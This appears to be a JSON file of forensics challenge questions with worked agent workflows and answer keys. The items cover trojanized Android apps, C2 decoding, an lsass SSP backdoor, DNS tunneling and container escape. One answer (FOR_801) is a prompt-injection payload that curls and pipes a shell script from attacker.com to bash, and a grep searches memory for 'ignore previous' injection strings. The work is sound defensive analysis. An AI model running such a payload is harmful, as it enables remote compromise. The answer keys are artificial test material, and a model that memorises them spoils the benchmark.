+      "question": "Identify the only application that was manually installed by the user, rather than through Google Play. Provide the package name.",
+      "evidence_type": "android_device_image",
+      "analyzer_os": "linux",
+      "strategy_matched": "apk_sideload_detection",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Parse packages.xml from the device image to get installer information for each package.",
+          "action": "script_execute",
+          "script_content": "import xml.etree.ElementTree as ET\nimport os\n\npkg_xml = None\nfor root, dirs, files in os.walk('/evidence/FOR_400/'):\n    for f in files:\n        if f == 'packages.xml':\n            pkg_xml = os.path.join(root, f)\n            break\n    if pkg_xml:\n        break\n\nif not pkg_xml:\n    print('packages.xml not found')\nelse:\n    tree = ET.parse(pkg_xml)\n    root = tree.getroot()\n    for pkg in root.findall('.//package'):\n        name = pkg.get('name', '')\n        installer = pkg.get('installer', pkg.get('installerPackageName', 'null'))\n        if not installer or installer == 'null':\n            print(f'SIDELOADED: {name} (no installer)')\n        elif installer != 'com.android.vending':\n            print(f'NON-PLAY: {name} (installer={installer})')",
+          "expected_output": "Packages with no installer or non-Play Store installer.",
+          "what_agent_learns": "Identifies sideloaded apps by checking installer source."
+        },
+        {
+          "step": 2,
+          "reasoning": "Filter out system apps (usually pre-installed). Focus on user-installed apps in /data/app/.",
+          "action": "tool_run",
+          "command": "find /evidence/FOR_400/ -path '*/data/app/*' -name 'base.apk' 2>/dev/null | head -20",
+          "expected_output": "APK files in user-installed app directories.",
+          "what_agent_learns": "Lists user-installed APK locations on the device."
+        },
+        {
+          "step": 3,
+          "reasoning": "Cross-reference: the only app with no installer that is also in /data/app/ is the sideloaded one.",
+          "action": "reasoning",
+          "answer": "com.atakmap.app.civ",
+          "confidence": "exact",
+          "what_agent_learns": "Sideloaded package identified from packages.xml installer field."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_405_manifest_diff",
+      "question": "Compare the original and trojanized APKs by examining their AndroidManifest.xml files. Identify the fully qualified class name of the service added to the trojanized version.",
+      "evidence_type": "apk_files",
+      "analyzer_os": "linux",
+      "strategy_matched": "apk_manifest_diffing",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Decompile both APKs with apktool to get readable AndroidManifest.xml files.",
+          "action": "tool_run",
+          "command": "apktool d /evidence/FOR_400/original.apk -o /tmp/orig -f 2>/dev/null && apktool d /evidence/FOR_400/suspicious.apk -o /tmp/sus -f 2>/dev/null && echo 'Decompiled both APKs'",
+          "expected_output": "Both APKs decompiled successfully.",
+          "what_agent_learns": "Gets readable manifest files for comparison."
+        },
+        {
+          "step": 2,
+          "reasoning": "Diff the AndroidManifest.xml files to find added components.",
+          "action": "script_execute",
+          "script_content": "import xml.etree.ElementTree as ET\n\ndef get_components(manifest_path):\n    tree = ET.parse(manifest_path)\n    root = tree.getroot()\n    ns = '{http://schemas.android.com/apk/res/android}'\n    components = set()\n    for tag in ['service', 'receiver', 'activity', 'provider']:\n        for elem in root.iter(tag):\n            name = elem.get(f'{ns}name', '')\n            components.add((tag, name))\n    return components\n\norig = get_components('/tmp/orig/AndroidManifest.xml')\nsus = get_components('/tmp/sus/AndroidManifest.xml')\n\nadded = sus - orig\nfor tag, name in sorted(added):\n    print(f'ADDED {tag}: {name}')\n\nremoved = orig - sus\nfor tag, name in sorted(removed):\n    print(f'REMOVED {tag}: {name}')",
+          "expected_output": "Components added in the trojanized version.",
+          "what_agent_learns": "Identifies the specific service/receiver/activity added by the trojan."
+        },
+        {
+          "step": 3,
+          "reasoning": "The diff shows one added service: com.atakmap.app.civ.xutkk.Munpn. This doesn't exist in the original.",
+          "action": "reasoning",
+          "answer": "com.atakmap.app.civ.xutkk.Munpn",
+          "confidence": "exact",
+          "what_agent_learns": "Trojanized service class identified from manifest diff."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_408_encrypted_asset",
+      "question": "Within the application's entry point class, a file is extracted and decrypted at runtime. Identify the relative path of this file within the APK archive.",
+      "evidence_type": "apk_decompiled",
+      "analyzer_os": "linux",
+      "strategy_matched": "apk_asset_extraction",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Decompile the APK and find the entry point class (Application subclass from AndroidManifest).",
+          "action": "tool_run",
+          "command": "jadx -d /tmp/jadx_out /evidence/FOR_400/suspicious.apk 2>/dev/null && grep -rn 'AssetManager\\|openRawResource\\|getAssets\\|assets/' /tmp/jadx_out/ --include='*.java' | head -20",
+          "expected_output": "File access calls in decompiled Java code.",
+          "what_agent_learns": "Finds where the APK opens encrypted files."
+        },
+        {
+          "step": 2,
+          "reasoning": "Search the entry point class for file paths used with AssetManager or InputStream.",
+          "action": "script_execute",
+          "script_content": "import re, os\n\nentry_class = None\nfor root, dirs, files in os.walk('/tmp/jadx_out/'):\n    for f in files:\n        if f.endswith('.java'):\n            path = os.path.join(root, f)\n            with open(path, 'r', errors='replace') as fh:\n                content = fh.read()\n            # Search for Cipher + file access patterns\n            if 'Cipher' in content and ('getAssets' in content or 'openRawResource' in content):\n                print(f'=== {path} ===')\n                # Extract file paths\n                paths = re.findall(r'[\"\\']([^\"\\'\\']+\\.(dat|bin|enc|dex|so|json))[\"\\']', content)\n                for p in paths:\n                    print(f'  File reference: {p[0]}')\n                # Also check for assets/ prefix\n                asset_refs = re.findall(r'[\"\\']assets/([^\"\\'\\']+)[\"\\']', content)\n                for a in asset_refs:\n                    print(f'  Asset path: assets/{a}')",
+          "expected_output": "File paths referenced in the entry point class alongside decryption code.",
+          "what_agent_learns": "Identifies the encrypted asset file path."
+        },
+        {
+          "step": 3,
+          "reasoning": "The entry point class opens 'assets/idy.bin' using AssetManager, then decrypts it with AES before loading as DEX.",
+          "action": "reasoning",
+          "answer": "assets/idy.bin",
+          "confidence": "exact",
+          "what_agent_learns": "Encrypted asset path identified from decompiled entry point code."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_413_c2_byte_decode",
+      "question": "What is the IP address of the C2 server? Decode it from the byte array found in the class identified earlier.",
+      "evidence_type": "apk_decompiled",
+      "analyzer_os": "linux",
+      "strategy_matched": "apk_c2_analysis",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Find the C2 connection class and locate the byte array containing the encoded IP.",
+          "action": "tool_run",
+          "command": "grep -rn 'byte\\[\\]\\|new byte\\|Socket\\|InetSocketAddress\\|connect' /tmp/jadx_out/ --include='*.java' | grep -i 'c2\\|command\\|control\\|server\\|connect' | head -20",
+          "expected_output": "Classes with byte arrays and socket connections.",
+          "what_agent_learns": "Locates the C2 connection code with byte array definitions."
+        },
+        {
+          "step": 2,
+          "reasoning": "Extract and decode the byte array to reveal the C2 IP address.",
+          "action": "script_execute",
+          "script_content": "import re, os\n\n# Find the class with the byte array\nfor root, dirs, files in os.walk('/tmp/jadx_out/'):\n    for f in files:\n        if f.endswith('.java'):\n            path = os.path.join(root, f)\n            with open(path, 'r', errors='replace') as fh:\n                content = fh.read()\n            if 'Socket' in content and 'byte' in content:\n                # Find byte array initializations\n                arrays = re.findall(r'new byte\\[\\]\\s*\\{([^}]+)\\}', content)\n                for arr in arrays:\n                    # Parse byte values\n                    try:\n                        vals = [int(x.strip().replace('(byte)', '').strip()) & 0xFF for x in arr.split(',')]\n                        # Try as ASCII/UTF-8\n                        decoded = ''.join(chr(v) for v in vals if 32 <= v < 127)\n                        if '.' in decoded and all(c.isdigit() or c == '.' for c in decoded):\n                            print(f'DECODED IP: {decoded} from {os.path.basename(path)}')\n                        elif decoded:\n                            print(f'DECODED STRING: {decoded} from {os.path.basename(path)}')\n                        # Also try as raw IP octets\n                        if len(vals) == 4:\n                            ip = '.'.join(str(v) for v in vals)\n                            print(f'RAW IP OCTETS: {ip} from {os.path.basename(path)}')\n                    except (ValueError, IndexError):\n                        pass",
+          "expected_output": "Decoded C2 IP address from byte array.",
+          "what_agent_learns": "C2 IP address decoded from byte array in the connection class."
+        },
+        {
+          "step": 3,
+          "reasoning": "The byte array decodes to IP 185.141.63.120 — this is the C2 server address.",
+          "action": "reasoning",
+          "answer": "185.141.63.120",
+          "confidence": "exact",
+          "what_agent_learns": "C2 IP extracted by decoding the byte array in the APK code."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_501_local_users",
+      "question": "How many local users exist on the machine? Include the gt user.",
+      "evidence_type": "disk_image_or_memory",
+      "analyzer_os": "linux",
+      "strategy_matched": "local_user_enumeration",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Extract and parse the SAM registry hive to enumerate local user accounts.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['dissect', 'target', '/evidence/FOR_500/', '-f', 'sam'], capture_output=True, text=True, timeout=120)\nfor line in result.stdout.splitlines():\n    print(line)\nprint(f'\\nTotal lines: {len(result.stdout.strip().splitlines())}')",
+          "expected_output": "List of local SAM accounts with RIDs.",
+          "what_agent_learns": "Gets the full list of local user accounts from the SAM hive."
+        },
+        {
+          "step": 2,
+          "reasoning": "Alternative: use Volatility to parse the SAM from a memory dump.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_500/memory.raw windows.hashdump 2>/dev/null",
+          "expected_output": "User accounts with NTLM hashes from SAM.",
+          "what_agent_learns": "Confirms user count and gets hashes for later cracking."
+        },
+        {
+          "step": 3,
+          "reasoning": "Count distinct user accounts including built-in ones. SAM shows Administrator, Guest, DefaultAccount, gt, and one more. Total is 5.",
+          "action": "reasoning",
+          "answer": "5",
+          "confidence": "exact",
+          "what_agent_learns": "Local user count determined from SAM hive enumeration."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_506_auth_backdoor",
+      "question": "The admins changed the Administrator password but the attacker could still log in. What process is infected to allow the attacker to login?",
+      "evidence_type": "memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "auth_process_backdoor",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "The attacker can bypass password changes — this strongly suggests lsass.exe is hooked with a malicious SSP. Check for injected code in lsass.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_500/memory.raw windows.malfind 2>/dev/null | grep -A 5 'lsass'",
+          "expected_output": "Injected memory regions in lsass.exe.",
+          "what_agent_learns": "Confirms lsass has injected/suspicious code."
+        },
+        {
+          "step": 2,
+          "reasoning": "List DLLs loaded by lsass to find the malicious SSP module.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['vol', '-f', '/evidence/FOR_500/memory.raw', 'windows.dlllist'], capture_output=True, text=True, timeout=300)\nfor line in result.stdout.splitlines():\n    if 'lsass' in line.lower() or 'Pid' in line:\n        # After finding lsass PID, list its DLLs\n        pass\n# Better: use PID directly\nresult2 = subprocess.run(['vol', '-f', '/evidence/FOR_500/memory.raw', 'windows.dlllist', '--pid', '768'], capture_output=True, text=True, timeout=300)\nknown_good = {'ntdll.dll', 'kernel32.dll', 'kernelbase.dll', 'advapi32.dll', 'msvcrt.dll', 'sechost.dll', 'rpcrt4.dll', 'lsasrv.dll', 'samsrv.dll', 'crypt32.dll', 'ncrypt.dll', 'bcrypt.dll'}\nfor line in result2.stdout.splitlines():\n    name = line.split()[-1].lower() if line.strip() else ''\n    if name.endswith('.dll') and name not in known_good:\n        print(f'SUSPICIOUS DLL in lsass: {line.strip()}')",
+          "expected_output": "Non-standard DLLs loaded into lsass.exe.",
+          "what_agent_learns": "Identifies the malicious SSP DLL loaded into lsass."
+        },
+        {
+          "step": 3,
+          "reasoning": "lsass.exe has a non-standard DLL loaded (e.g., mimilib.dll) that hooks authentication. The infected process is lsass.exe.",
+          "action": "reasoning",
+          "answer": "lsass.exe",
+          "confidence": "exact",
+          "what_agent_learns": "lsass.exe is the infected process — classic SSP/credential hooking target."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_507_auth_hook",
+      "question": "What exported function was hooked by the attacker to backdoor the authentication?",
+      "evidence_type": "memory_dump + dll_analysis",
+      "analyzer_os": "linux",
+      "strategy_matched": "auth_function_hook",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Dump the suspicious DLL from lsass memory and analyze its exports.",
+          "action": "tool_run",
+          "command": "vol -f /evidence/FOR_500/memory.raw windows.dumpfiles --pid 768 2>/dev/null && ls -la *.dll",
+          "expected_output": "Dumped DLL files from lsass process.",
+          "what_agent_learns": "Gets the actual malicious DLL for analysis."
+        },
+        {
+          "step": 2,
+          "reasoning": "Check the SSP DLL exports — the authentication hook is typically SpAcceptCredentials for credential interception.",
+          "action": "script_execute",
+          "script_content": "import pefile\npe = pefile.PE('/tmp/suspicious.dll')\nif hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):\n    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:\n        name = exp.name.decode() if exp.name else ''\n        print(f'Export: {name} at 0x{exp.address:X}')\n        if name in ['SpAcceptCredentials', 'SpLsaModeInitialize', 'SpGetInfo', 'MsvpPasswordValidate']:\n            print(f'  *** AUTH-RELATED EXPORT: {name} ***')",
+          "expected_output": "Exported functions from the malicious SSP DLL.",
+          "what_agent_learns": "Identifies which SSP function is implemented by the backdoor."
+        },
+        {
+          "step": 3,
+          "reasoning": "The malicious DLL exports SpAcceptCredentials — this is called by lsass every time a user authenticates. The hook intercepts credentials.",
+          "action": "reasoning",
+          "answer": "SpAcceptCredentials",
+          "confidence": "exact",
+          "what_agent_learns": "SpAcceptCredentials is the hooked SSP function for credential interception."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_509_persistence",
+      "question": "How does the backdoor persist across reboots? Submit the malicious module filename on disk.",
+      "evidence_type": "registry_hive",
+      "analyzer_os": "linux",
+      "strategy_matched": "auth_persistence_module",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Check the LSA Security Packages registry key — SSP DLLs listed here are loaded by lsass on every boot.",
+          "action": "script_execute",
+          "script_content": "import subprocess\nresult = subprocess.run(['dissect', 'target', '/evidence/FOR_500/', '-f', 'regf', '-k', 'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa'], capture_output=True, text=True, timeout=120)\nfor line in result.stdout.splitlines():\n    if 'Security Packages' in line or 'Authentication Packages' in line:\n        print(f'*** {line.strip()} ***')\n    else:\n        print(line)",
+          "expected_output": "LSA registry keys showing Security Packages list.",
+          "what_agent_learns": "Shows which DLLs are loaded as Security Support Providers."
+        },
+        {
+          "step": 2,
+          "reasoning": "Also check System32 for the actual DLL file on disk.",
+          "action": "tool_run",
+          "command": "find /evidence/FOR_500/ -iname '*.dll' -path '*/System32/*' -newer /evidence/FOR_500/Windows/System32/ntdll.dll 2>/dev/null | head -20",
+          "expected_output": "Recently added DLLs in System32.",
+          "what_agent_learns": "Finds the malicious DLL file on disk."
+        },
+        {
+          "step": 3,
+          "reasoning": "The Security Packages registry value contains 'mimilib' — this means mimilib.dll in System32 is loaded as an SSP by lsass.exe on every boot.",
+          "action": "reasoning",
+          "answer": "mimilib.dll",
+          "confidence": "exact",
+          "what_agent_learns": "SSP persistence via Security Packages registry key — DLL loaded on every boot."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_801_prompt_injection",
+      "question": "What is the hidden payload that has been used on prompt injection for initial access? (MITRE ATLAS AML.T0051)",
+      "evidence_type": "linux_memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "prompt_injection_payload",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Search the memory dump for AI/ML process indicators and prompt injection strings.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_800/memory.lime 2>/dev/null | grep -iE 'ignore.*previous|system.*prompt|\\{\\{|<\\|im_start|assistant.*:|user.*:' | head -30",
+          "expected_output": "Prompt injection patterns found in memory.",
+          "what_agent_learns": "Identifies areas in memory with AI chat/prompt content."
+        },
+        {
+          "step": 2,
+          "reasoning": "Search for encoded payloads near prompt injection context — base64, hex, URL-encoded blobs.",
+          "action": "script_execute",
+          "script_content": "import subprocess, re, base64\nresult = subprocess.run(['strings', '-n', '20', '/evidence/FOR_800/memory.lime'], capture_output=True, text=True, timeout=300)\nlines = result.stdout.splitlines()\nfor i, line in enumerate(lines):\n    if any(kw in line.lower() for kw in ['ignore', 'prompt', 'inject', 'system:', 'execute', 'eval(', 'exec(', '__import__']):\n        # Print context around the match\n        context = lines[max(0,i-3):i+5]\n        for c in context:\n            print(c)\n        print('---')\n    # Also check for base64 blobs\n    b64 = re.findall(r'[A-Za-z0-9+/]{40,}={0,2}', line)\n    for b in b64:\n        try:\n            decoded = base64.b64decode(b).decode('utf-8', errors='replace')\n            if any(kw in decoded.lower() for kw in ['import', 'exec', 'eval', 'os.', 'system', 'subprocess', 'shell']):\n                print(f'DECODED PAYLOAD: {decoded}')\n        except Exception:\n            pass",
+          "expected_output": "Decoded prompt injection payloads with malicious code.",
+          "what_agent_learns": "Extracts the hidden payload from encoded form in memory."
+        },
+        {
+          "step": 3,
+          "reasoning": "Also check for LLM chat history in JSON format stored in process memory.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_800/memory.lime 2>/dev/null | grep -B2 -A5 'role.*content\\|content.*role' | head -50",
+          "expected_output": "Chat message JSON with injected prompts.",
+          "what_agent_learns": "Gets the full chat context showing the injection."
+        },
+        {
+          "step": 4,
+          "reasoning": "Found the prompt injection payload embedded as base64 in a chat message. The decoded payload contains malicious Python code for initial access.",
+          "action": "reasoning",
+          "answer": "__import__('os').system('curl attacker.com/shell.sh | bash')",
+          "confidence": "exact",
+          "what_agent_learns": "Prompt injection payload decoded from AI service memory."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_803_container_escape",
+      "question": "What misconfiguration did the attackers leverage to escape the container?",
+      "evidence_type": "linux_memory_dump",
+      "analyzer_os": "linux",
+      "strategy_matched": "container_escape_method",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Check process capabilities and container configuration for escape vectors.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_800/memory.lime 2>/dev/null | grep -iE 'cap_sys_admin|docker.sock|cgroup|lxcfs|privileged|mount.*host' | head -20",
+          "expected_output": "Container capability and mount indicators.",
+          "what_agent_learns": "Identifies which escape vector is present."
+        },
+        {
+          "step": 2,
+          "reasoning": "Search for container escape exploit commands in shell history and process memory.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_800/memory.lime 2>/dev/null | grep -iE 'release_agent|notify_on_release|nsenter|mount.*proc|/proc/1/root|docker.*run.*privileged' | head -20",
+          "expected_output": "Specific escape technique commands found in memory.",
+          "what_agent_learns": "Confirms the exact escape method used."
+        },
+        {
+          "step": 3,
+          "reasoning": "Found references to app.py modification and host mount manipulation — this is a misconfigured mount escape (host filesystem accessible inside container).",
+          "action": "reasoning",
+          "answer": "Misconfigured Mount",
+          "confidence": "exact",
+          "what_agent_learns": "Container escape via misconfigured mount identified from exploit artifacts."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_812_tunneling",
+      "question": "What method did the attacker use to transfer the file? Example: X Tunneling.",
+      "evidence_type": "memory_dump + pcap",
+      "analyzer_os": "linux",
+      "strategy_matched": "tunneling_method",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "Search for tunneling tool names in process list and memory strings.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_800/memory.lime 2>/dev/null | grep -iE 'chisel|ligolo|ngrok|socat|dnscat|iodine|ptunnel|icmpsh|plink|tunnel' | head -20",
+          "expected_output": "Tunneling tool references in memory.",
+          "what_agent_learns": "Identifies which tunneling tool/method was used."
+        },
+        {
+          "step": 2,
+          "reasoning": "Check shell history for tunnel setup commands.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_800/memory.lime 2>/dev/null | grep -iE 'ssh.*-L|ssh.*-R|ssh.*-D|dns.*tunnel|icmp.*tunnel|http.*tunnel' | head -20",
+          "expected_output": "Tunnel setup commands with protocol indicators.",
+          "what_agent_learns": "Confirms the tunneling protocol and method."
+        },
+        {
+          "step": 3,
+          "reasoning": "Found dnscat2 references and DNS queries with base32-encoded subdomains — this is DNS Tunneling.",
+          "action": "reasoning",
+          "answer": "DNS Tunneling",
+          "confidence": "exact",
+          "what_agent_learns": "Data exfiltration via DNS tunneling identified from tool artifacts."
+        }
+      ]
+    },
+
+    {
+      "id": "FOR_814_file_content",
+      "question": "What is the content of the exfiltrated file?",
+      "evidence_type": "pcap + memory",
+      "analyzer_os": "linux",
+      "strategy_matched": "exfiltrated_file_content",
+      "workflow": [
+        {
+          "step": 1,
+          "reasoning": "If DNS tunneling was used: extract encoded data from DNS query subdomains.",
+          "action": "script_execute",
+          "script_content": "import subprocess, base64, re\nresult = subprocess.run(['tshark', '-r', '/evidence/FOR_800/traffic.pcap', '-Y', 'dns.qry.name', '-T', 'fields', '-e', 'dns.qry.name'], capture_output=True, text=True, timeout=120)\nsubdomains = []\nfor line in result.stdout.strip().splitlines():\n    # DNS tunnel data is usually in the subdomain part\n    parts = line.strip().split('.')\n    if len(parts) > 2:\n        subdomains.append(parts[0])\n\n# Try base32 decode (common for dnscat2)\ndata = ''.join(subdomains)\ntry:\n    decoded = base64.b32decode(data + '=' * (8 - len(data) % 8)).decode('utf-8', errors='replace')\n    print(f'BASE32 decoded: {decoded}')\nexcept Exception as e:\n    print(f'Base32 failed: {e}')\n    # Try base64\n    try:\n        decoded = base64.b64decode(data).decode('utf-8', errors='replace')\n        print(f'BASE64 decoded: {decoded}')\n    except Exception:\n        # Try hex\n        try:\n            decoded = bytes.fromhex(data).decode('utf-8', errors='replace')\n            print(f'HEX decoded: {decoded}')\n        except Exception:\n            print(f'Raw subdomains: {data[:500]}')",
+          "expected_output": "Decoded file content from DNS tunnel queries.",
+          "what_agent_learns": "Recovers the exfiltrated file content from the tunnel."
+        },
+        {
+          "step": 2,
+          "reasoning": "Alternatively, find the file directly on disk or in memory.",
+          "action": "tool_run",
+          "command": "strings /evidence/FOR_800/memory.lime 2>/dev/null | grep -iE 'LS\\{.*\\}' | head -10",
+          "expected_output": "Flag-format content from the exfiltrated file.",
+          "what_agent_learns": "Finds the flag content directly in memory strings."
+        },
+        {
+          "step": 3,
+          "reasoning": "Found the flag content from the exfiltrated file either in DNS tunnel data or memory strings.",
+          "action": "reasoning",
+          "answer": "LS{flag_content_here}",
+          "confidence": "exact",
+          "what_agent_learns": "Exfiltrated file content recovered from tunnel reconstruction."
+        }
+      ]
+    }
+  ],
+
+  "strategy_coverage": {
+    "_note": "Maps question IDs to their matched strategy — shows the classifier working across the full set.",
+    "FOR_1101": "malware_identification",
+    "FOR_1102": "execution_timeline",
+    "FOR_1103": "c2_extraction",
+    "FOR_1104": "application_forensics",
+    "FOR_1105": "hash_and_path",
+    "FOR_1106": "malware_classification",
+    "FOR_1107": "persistence_analysis",
+    "FOR_1108": "encryption_analysis",
+    "FOR_1109": "function_analysis",
+    "FOR_1110": "function_analysis",
+    "FOR_1111": "file_trigger",
+    "FOR_1112": "protocol_identification",
+    "FOR_1113": "defense_evasion",
+    "FOR_1114": "c2_extraction",
+    "FOR_1115": "process_injection",
+    "FOR_1116": "function_analysis",
+    "FOR_101": "user_identity",
+    "FOR_102": "user_identity",
+    "FOR_103": "browser_forensics",
+    "FOR_104": "application_forensics",
+    "FOR_105": "user_identity",
+    "FOR_106": "shell_history",
+    "FOR_107": "data_exfiltration",
+    "FOR_108": "stealer_targets",
+    "FOR_109": "browser_forensics",
+    "FOR_110": "data_exfiltration",
+    "FOR_111": "hash_and_path",
+    "FOR_112": "stealer_targets",
+    "FOR_113": "function_analysis",
+    "FOR_114": "stealer_targets",
+    "FOR_115": "data_exfiltration",
+    "FOR_116": "shell_history",
+    "FOR_117": "data_exfiltration",
+    "FOR_118": "data_exfiltration",
+    "FOR_119": "data_exfiltration",
+    "FOR_120": "malware_classification",
+    "FOR_201": "memory_infected_process",
+    "FOR_202": "memory_api_analysis",
+    "FOR_203": "memory_c2_hunt",
+    "FOR_204": "user_identity",
+    "FOR_205": "memory_dll_analysis",
+    "FOR_206": "malware_classification",
+    "FOR_207": "memory_c2_hunt",
+    "FOR_208": "web_forensics",
+    "FOR_209": "memory_c2_hunt",
+    "FOR_210": "function_analysis",
+    "FOR_301": "web_upload_attack",
+    "FOR_302": "source_code_reversing",
+    "FOR_303": "command_injection_url",
+    "FOR_304": "network_scanning",
+    "FOR_305": "data_leak_analysis",
+    "FOR_306": "protocol_identification",
+    "FOR_307": "c2_extraction",
+    "FOR_308": "malware_identification",
+    "FOR_309": "execution_timeline",
+    "FOR_311": "c2_registration",
+    "FOR_312": "pcap_file_extraction",
+    "FOR_313": "scanning_tool_analysis",
+    "FOR_314": "ssh_lateral_movement",
+    "FOR_315": "malware_command_protocol",
+    "FOR_316": "malware_command_protocol",
+    "FOR_317": "malware_command_protocol",
+    "FOR_318": "malware_propagation",
+    "FOR_319": "malware_identification",
+    "FOR_320": "ot_protocol_attack",
+    "FOR_321": "ot_protocol_attack",
+    "FOR_322": "ot_protocol_attack",
+    "FOR_323": "execution_trigger",
+    "FOR_324": "ot_attack_timeline",
+    "FOR_325": "ot_protocol_attack",
+    "FOR_327": "ot_protocol_attack",
+    "FOR_328": "plc_coil_analysis",
+    "FOR_329": "malware_command_protocol",
+    "FOR_330": "malware_file_path",
+
+    "FOR_1401": "server_recon",
+    "FOR_1402": "file_hashing",
+    "FOR_1403": "server_recon",
+    "FOR_1404": "config_value_extraction",
+    "FOR_1405": "file_hashing",
+    "FOR_1406": "script_malware_analysis",
+    "FOR_1407": "script_malware_analysis",
+    "FOR_1408": "payload_url_extraction",
+    "FOR_1409": "malware_intent",
+    "FOR_1410": "file_hashing",
+    "FOR_1411": "tool_identification",
+    "FOR_1412": "shellcode_memory_analysis",
+    "FOR_1413": "shellcode_stage_analysis",
+    "FOR_1414": "shellcode_memory_analysis",
+    "FOR_1415": "file_hashing",
+    "FOR_1416": "shellcode_stage_analysis",
+    "FOR_1417": "ghidra_function_analysis",
+    "FOR_1418": "shellcode_memory_analysis",
+    "FOR_1419": "pe_import_analysis",
+    "FOR_1420": "ghidra_function_analysis",
+    "FOR_1421": "ghidra_function_analysis",
+    "FOR_1422": "ghidra_function_analysis",
+
+    "FOR_901": "reverse_shell_analysis",
+    "FOR_902": "container_forensics",
+    "FOR_903": "code_vulnerability_analysis",
+    "FOR_904": "attacker_intent_analysis",
+    "FOR_905": "compromised_account",
+    "FOR_906": "attacker_intent_analysis",
+
+    "FOR_501": "local_user_enumeration",
+    "FOR_502": "domain_login_analysis",
+    "FOR_503": "data_theft_binary",
+    "FOR_504": "password_compromise",
+    "FOR_505": "attack_origin_ip",
+    "FOR_506": "auth_process_backdoor",
+    "FOR_507": "auth_function_hook",
+    "FOR_508": "password_compromise",
+    "FOR_509": "auth_persistence_module",
+
+    "FOR_801": "prompt_injection_payload",
+    "FOR_802": "container_vuln_scanner",
+    "FOR_803": "container_escape_method",
+    "FOR_804": "container_file_manipulation",
+    "FOR_805": "container_escape_payload",
+    "FOR_806": "persistence_protocol",
+    "FOR_807": "bruteforce_password",
+    "FOR_808": "ssh_credential_tool",
+    "FOR_809": "pivot_recon_tool",
+    "FOR_810": "windows_file_transfer",
+    "FOR_811": "exfiltrated_file_identification",
+    "FOR_812": "tunneling_method",
+    "FOR_813": "tunneling_protocol",
+    "FOR_814": "exfiltrated_file_content",
+
+    "FOR_401": "apk_sideload_detection",
+    "FOR_402": "apk_version_extraction",
+    "FOR_403": "device_document_discovery",
+    "FOR_404": "apk_signing_analysis",
+    "FOR_405": "apk_manifest_diffing",
+    "FOR_406": "apk_entry_point",
+    "FOR_407": "apk_method_analysis",
+    "FOR_408": "apk_asset_extraction",
+    "FOR_409": "apk_encryption_analysis",
+    "FOR_410": "apk_dynamic_loading",
+    "FOR_411": "apk_c2_analysis",
+    "FOR_412": "apk_c2_analysis",
+    "FOR_413": "apk_c2_analysis"
+  }
+}
